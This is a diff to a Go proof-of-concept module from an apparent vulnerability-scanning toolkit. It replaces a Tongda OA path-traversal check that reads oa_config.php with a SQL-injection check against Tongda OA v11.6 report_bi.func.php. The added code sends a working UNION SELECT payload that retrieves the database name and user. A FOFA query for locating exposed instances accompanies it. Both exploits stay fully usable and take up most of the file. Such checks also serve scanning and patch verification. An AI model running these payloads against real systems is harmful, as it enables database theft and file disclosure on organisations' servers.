@@ -2,6 +2,7 @@ package main
 
 import (
 	"errors"
+	"fmt"
 	"github.com/ExpLangcn/HwToolslibrary/library/httpclient"
 	"github.com/ExpLangcn/HwToolslibrary/library/info"
 	"net/http"
@@ -14,30 +15,36 @@ var Httprecord = make(map[*httpclient.RequestOptions]*httpclient.Response) // �
 func init() {
 	POC = info.POC{ // 初始化POC信息
 		Info: info.POCInfo{
-			Name:     "通达OA任意文件下载漏洞",
+			Name:     "通达OA_v11.6_report_bi.func_SQL注入漏洞",
 			Author:   "ExpLang",
-			Describe: "通达OA文件存在任意文件下载漏洞，攻击者通过漏洞可以读取服务器敏感文件",
-			Date:     "2023-09-27",
-			Tags:     []string{"通达OA", "TongdaOA", "Download File", "任意文件下载"},
+			Describe: "通达OA_v11.6_report_bi.func_存在SQL注入漏洞，攻击者通过漏洞可以获取数据库信息",
+			Date:     "2023-09-26",
+			Tags:     []string{"通达OA", "TongdaOA", "sqli", "sql注入"},
 			Level:    "high",
-			Link:     []string{"https://peiqi.h-k.pw/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v2017%20video_file.php%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.html"},
+			Link:     []string{"https://peiqi.h-k.pw/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20report_bi.func.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"},
 		},
 		Other: info.OtherInfo{
-			FOFAGrammar:  "app=\"TDXK-TongdaOA\"",
+			FOFAGrammar:  "app=\"TDXK-通达OA\"",
 			QuakeGrammar: "",
 		},
 	}
 }
 
 func Start(Target string, ProxyURL string) (bool, error) {
-	// 定义请求选项
+	// 构建请求体
+	requestBody := "_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info"
+
 	requestOption := &httpclient.RequestOptions{
-		Method: http.MethodGet,
-		URL:    Target + "/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php",
+		Method: http.MethodPost,
+		URL:    Target + "/general/bi_design/appcenter/report_bi.func.php",
 		Headers: map[string]string{
-			"User-Agent": httpclient.RandomUserAgent(),
+			"User-Agent":      httpclient.RandomUserAgent(),
+			"Content-Type":    "application/x-www-form-urlencoded",
+			"Content-Length":  fmt.Sprintf("%d", len(requestBody)),
+			"Accept-Encoding": "gzip",
 		},
-		ProxyURL: ProxyURL,
+		ProxyURL:    ProxyURL,
+		RequestBody: []byte(requestBody),
 	}
 
 	// 发送请求
@@ -58,9 +65,9 @@ func Start(Target string, ProxyURL string) (bool, error) {
 
 	statusCode := responseOption.StatusCode
 	if statusCode == http.StatusOK {
-		// 检查响应内容是否包含 "$ROOT_PATH=getenv"
+		// 检查响应包内容是否包含 "col":" 字符串
 		responseBody := string(responseOption.Body)
-		if strings.Contains(responseBody, "$ROOT_PATH=getenv") {
+		if strings.Contains(responseBody, "col\":\"") {
 			return true, nil
 		}
 	}
